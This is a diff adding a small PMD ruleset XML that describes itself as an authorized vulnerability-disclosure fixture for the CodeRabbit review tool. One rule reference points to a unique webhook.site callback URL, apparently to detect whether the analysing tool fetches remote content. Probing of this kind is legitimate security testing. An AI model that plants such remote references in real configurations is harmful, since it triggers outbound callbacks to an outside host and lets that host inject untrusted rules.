@@ -1,0 +1,6 @@
+<?xml version="1.0"?>
+<ruleset name="RD_PMD_RD_156930" xmlns="http://pmd.sourceforge.net/ruleset/2.0.0">
+  <description>Authorized CodeRabbit VDP fixture: remote rule reference fetch.</description>
+  <rule ref="https://webhook.site/cb2d5142-ce78-4bcd-9c96-b4377e044f86/rd-pmd-ruleset.xml"/>
+  <rule ref="category/java/bestpractices.xml/UnusedLocalVariable"/>
+</ruleset>
